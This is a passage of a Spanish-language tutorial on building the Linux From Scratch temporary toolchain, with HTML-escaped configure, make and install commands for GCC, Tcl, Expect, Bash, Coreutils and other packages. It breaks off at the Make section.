&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;CC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LFS_TGT&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-gcc&lt;/span&gt;                                    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;CXX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LFS_TGT&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt;++                                   &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;AR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LFS_TGT&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ar&lt;/span&gt;                                     &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;RANLIB&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LFS_TGT&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ranlib&lt;/span&gt;                             &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
../configure                                       &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools                                &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--with-local-prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools                     &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--with-native-system-header-dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools/include &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--enable-languages&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;c,c++                       &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--disable-libstdcxx-pch&lt;/span&gt;                        &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--disable-multilib&lt;/span&gt;                             &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--disable-bootstrap&lt;/span&gt;                            &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--disable-libgomp&lt;/span&gt;

make
make &lt;span class=&quot;nb&quot;&gt;install
ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sv&lt;/span&gt; gcc /tools/bin/cc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Igual que hicimos la primera vez, tendremos que validar que las funciones básicas (compilación y linking) de la nueva toolchain están funcionando correctamente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'int main(){}'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; dummy.c
cc dummy.c
readelf &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; a.out | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;': /tools'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Teniendo que ver un output como el siguiente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Requesting program interpreter: /tools/lib64/ld-linux-x86-64.so.2]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Si eso es así, buen trabajo. Eliminamos los ficheros y directorios innecesarios:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; dummy.c a.out
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ../..
&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; gcc-9.2.0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348qv.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;compilación-tcl&quot;&gt;Compilación Tcl&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, tendremos que descomprimir el comprimido &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcl8.6.10-src.tar.gz&lt;/code&gt;. Posteriormente, ejecutaremos los siguientes comandos dentro del directorio:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;unix

./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools

make
&lt;span class=&quot;nv&quot;&gt;TZ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;UTC make &lt;span class=&quot;nb&quot;&gt;test
&lt;/span&gt;make &lt;span class=&quot;nb&quot;&gt;install

chmod&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; u+w /tools/lib/libtcl8.6.so
make install-private-headers
&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sv&lt;/span&gt; tclsh8.6 /tools/bin/tclsh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez terminado, retrocedemos 2 directorios y borramos el directorio:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348rB.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;compilación-expect&quot;&gt;Compilación Expect&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, tendremos que descomprimir el comprimido &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;expect5.45.4.tar.gz&lt;/code&gt;, posteriormente, ejecutaremos los siguientes comandos dentro del directorio:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; configure&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;,.orig&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s:/usr/local/bin:/bin:'&lt;/span&gt; configure.orig &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; configure

./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools       &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--with-tcl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools/lib &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--with-tclinclude&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools/include

make
make &lt;span class=&quot;nb&quot;&gt;test
&lt;/span&gt;make &lt;span class=&quot;nv&quot;&gt;SCRIPTS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizado, retrocedemos 1 directorio y borramos el directorio principal:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348s6.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;compilación-dejagnu&quot;&gt;Compilación DejaGNU&lt;/h5&gt;

&lt;p&gt;La instalación de este paquete es bastante rápida. En primer lugar, descomprimimos el comprimido &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dejagnu-1.6.2.tar.gz&lt;/code&gt;. Posteriormente, ejecutamos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools
make &lt;span class=&quot;nb&quot;&gt;install
&lt;/span&gt;make check
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, retrocedemos un directorio y borramos el directorio principal:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348sm.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;compilación-m4&quot;&gt;Compilación M4&lt;/h5&gt;

&lt;p&gt;Para instalar este paquete, descomprimiremos el comprimido &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;m4-1.4.18.tar.xz&lt;/code&gt;, nos meteremos en el directorio descomprimido y efectuaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/IO_ftrylockfile/IO_EOF_SEEN/'&lt;/span&gt; lib/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.c
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;#define _IO_IN_BACKUP 0x100&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; lib/stdio-impl.h

./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools

make
make check
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Durante el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;make check&lt;/code&gt;, deberíamos ver algo como esto:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348tc.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos un directorio y borramos el directorio principal:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348td.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;compilación-ncurses&quot;&gt;Compilación Ncurses&lt;/h5&gt;

&lt;p&gt;Para instalar este paquete, necesitaremos descomprimir el comprimido con nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ncurses-6.2.tar.gz&lt;/code&gt;. Una vez hecho, aplicaremos los siguientes comandos dentro del directorio descomprimido:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; s/mawk// configure

./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--with-shared&lt;/span&gt;   &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--without-debug&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--without-ada&lt;/span&gt;   &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--enable-widec&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--enable-overwrite&lt;/span&gt;

make
make &lt;span class=&quot;nb&quot;&gt;install
ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; libncursesw.so /tools/lib/libncurses.so
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Ncurses.&lt;/p&gt;

&lt;h5 id=&quot;compilación-bash&quot;&gt;Compilación Bash&lt;/h5&gt;

&lt;p&gt;Para instalar este paquete, necesitaremos descomprimir el comprimido con nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash-5.0.tar.gz&lt;/code&gt;. Una vez hecho, ejecutaremos los siguientes comandos dentro del directorio descomprimido:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools &lt;span class=&quot;nt&quot;&gt;--without-bash-malloc&lt;/span&gt;
make
make tests
make &lt;span class=&quot;nb&quot;&gt;install
ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sv&lt;/span&gt; bash /tools/bin/sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, retrocederemos un directorio y borraremos el directorio principal de Bash:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348v6.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;compilación-bison&quot;&gt;Compilación Bison&lt;/h5&gt;

&lt;p&gt;Para la compilación de este paquete, haremos uso del paquete &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bison-3.5.2.tar.xz&lt;/code&gt;. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools

make
make check
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Bison:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348w3.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;compilación-bzip2&quot;&gt;Compilación Bzip2&lt;/h5&gt;

&lt;p&gt;Para la compilación de este paquete, haremos uso del paquete &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bzip2-1.0.8.tar.gz&lt;/code&gt;. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;make &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; Makefile-libbz2_so
make clean

make

make &lt;span class=&quot;nv&quot;&gt;PREFIX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools &lt;span class=&quot;nb&quot;&gt;install
cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; bzip2-shared /tools/bin/bzip2
&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-av&lt;/span&gt; libbz2.so&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; /tools/lib
&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sv&lt;/span&gt; libbz2.so.1.0 /tools/lib/libbz2.so
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Bzip2:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348wj.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;compilación-coreutils&quot;&gt;Compilación Coreutils&lt;/h5&gt;

&lt;p&gt;Para la compilación de este paquete, haremos uso del paquete &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;coreutils-8.31.tar.xz&lt;/code&gt;. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools &lt;span class=&quot;nt&quot;&gt;--enable-install-program&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hostname

&lt;/span&gt;make
make &lt;span class=&quot;nv&quot;&gt;RUN_EXPENSIVE_TESTS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;yes &lt;/span&gt;check
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Coreutils:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348xi.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;compilación-diffutils&quot;&gt;Compilación Diffutils&lt;/h5&gt;

&lt;p&gt;Para la compilación de este paquete, haremos uso del paquete &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;diffutils-3.7.tar.xz&lt;/code&gt;. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools
make
make check
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Diffutils:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348xB.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;compilación-file&quot;&gt;Compilación File&lt;/h5&gt;

&lt;p&gt;Para la compilación de este paquete, haremos uso del paquete &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file-5.38.tar.gz&lt;/code&gt;. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools
make
make check
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, retrocedemos un directorio y borramos el directorio principal de File:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348xH.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;compilación-findutils&quot;&gt;Compilación Findutils&lt;/h5&gt;

&lt;p&gt;Para la compilación de este paquete, haremos uso del paquete &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;findutils-4.7.0.tar.xz&lt;/code&gt;. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools
make
make check
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Findutils:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348y1.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Bueno, en este punto… como ya hemos avanzado considerablemente, ¡toca hacer otro Snapshot!:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348yu.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;compilación-gawk&quot;&gt;Compilación Gawk&lt;/h5&gt;

&lt;p&gt;Para la compilación de este paquete, haremos uso del paquete &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gawk-5.0.1.tar.xz&lt;/code&gt;. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools
make
make check
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Importante&lt;/strong&gt;: Es probable que el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;make check&lt;/code&gt; devuelva errores, pero no hay de qué preocuparse.&lt;/p&gt;

&lt;p&gt;Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Gawk:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349ii.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;compilación-gettext&quot;&gt;Compilación Gettext&lt;/h5&gt;

&lt;p&gt;Para la compilación de este paquete, haremos uso del paquete &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gettext-0.20.1.tar.xz&lt;/code&gt;. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--disable-shared&lt;/span&gt;
make
&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; gettext-tools/src/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;msgfmt,msgmerge,xgettext&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; /tools/bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Gettext:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349iX.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;compilación-grep&quot;&gt;Compilación Grep&lt;/h5&gt;

&lt;p&gt;Para la compilación de este paquete, haremos uso del paquete &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep-3.4.tar.xz&lt;/code&gt;. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools

make
make check
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Grep:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349jf.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;compilación-gzip&quot;&gt;Compilación Gzip&lt;/h5&gt;

&lt;p&gt;Para la compilación de este paquete, haremos uso del paquete &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gzip-1.10.tar.xz&lt;/code&gt;. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools

make
make check
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Gzip:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349jy.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;compilación-make&quot;&gt;Compilación Make&lt;/h5&gt;

